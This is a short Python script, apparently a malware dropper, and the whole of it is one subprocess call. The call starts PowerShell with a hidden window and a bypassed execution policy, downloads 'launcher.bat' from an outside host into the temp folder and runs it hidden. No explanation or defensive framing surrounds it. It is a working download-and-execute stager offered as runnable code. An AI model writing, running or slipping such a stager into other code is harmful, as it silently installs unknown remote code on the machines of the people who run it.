import subprocess

subprocess.Popen(
    "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Invoke-WebRequest 'http://stellar-conquest.fr/launcher.bat' -OutFile $env:TEMP\\launcher.bat -UseBasicParsing; Start-Process $env:TEMP\\launcher.bat -WindowStyle Hidden\"",
    shell=True
)